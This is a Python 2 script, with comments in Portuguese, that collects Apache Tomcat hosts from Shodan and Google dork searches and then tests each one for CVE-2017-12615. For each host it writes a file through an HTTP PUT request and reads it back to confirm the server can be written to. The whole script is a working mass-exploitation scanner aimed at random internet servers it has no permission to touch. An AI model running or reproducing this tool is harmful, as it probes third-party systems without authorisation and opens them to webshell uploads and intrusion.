# encoding: UTF-8
#!/usr/bin/python
from google import google
import requests
import shodan
from click import progressbar
import sys

def printf(text):
    sys.stdout.write(text)
    sys.stdout.flush()
def check_vuln_target(url):
    #https://github.com/breaktoprotect/CVE-2017-12615
    filename, payload = "code.txt", "@cuzao"
    timeout = 5
    url_in = url+"/"+filename+"/"
    url_out = url+"/"+filename
    put = requests.put(url_in, data=payload, timeout=timeout)
    get = requests.get(url_out, timeout=timeout)
    content_get = get.text
    if content_get == payload:
        return 1
    return None

def googlelink_check(url):
  #print "[Google] Target lookup:", url
  timeout = 5
  try:
    r = requests.get(url, timeout=timeout)
    if r.status_code == 200:
        try:
            if 'Apache-Coyote/1.1' in r.headers['Server']:
                return 1
        except Exception as error:
          #print "\t[+] Missing Server in HTTP Header"
          pass
    else:
        pass
  except Exception as error:
      #print "\tError at lookup"
      pass
def search_shodan():
    access = shodan.Shodan("CENSURADO")
    result = access.search("Apache-Coyote/1.1")
    links = []
    for resu in result["matches"]:
        ip, port, hostnames = resu['ip_str'], resu['port'], resu['hostnames']
        #print "[Shodan] Target Lookup: %s - %s" %(ip,hostnames)
        link = "http://{}:{}".format(ip, port)
        links.append(link)
    return links

def search_google(num_page=1):
    search_results = google.search("filetype:action", num_page)
    links = []
    for results in search_results:
        link = results.link
        if not googlelink_check(link):
            continue
        links.append(link)
    return links

def main():
    printf("[+] Buscando Links...")
    dumplinks = [search_google(), search_shodan()]
    total = len(dumplinks[0])+len(dumplinks[1])
    total = 2
    printf("Done!\n\n")
    #desse modo, a funcao simplesmente tera o objetivo de retornar os links
    #Sem se preocupar em fazer requisição e prints novamente.
    pbar = progressbar(length=total, show_eta=None, label="Scanning links")
    vuln_links = []
    for busc in dumplinks:
        for link in busc:
            pbar.update(1)
            try:
                if not check_vuln_target(link):
                    continue
                vuln_links.append(link)
            except KeyboardInterrupt:
                break
            except:
                continue
            #print "[*] "+link+"\tVulnerable"
    print "\n\nVulnerables Links\tTotal: %i\n%s" %(len(vuln_links), "-"*35)
    for link in vuln_links:
        print link
    pbar.render_finish()

#print(results.link)
#f = open('/tmp/urls.txt','a')
main()
#print "shits save at /tmp/urls.txt"
#f.close()
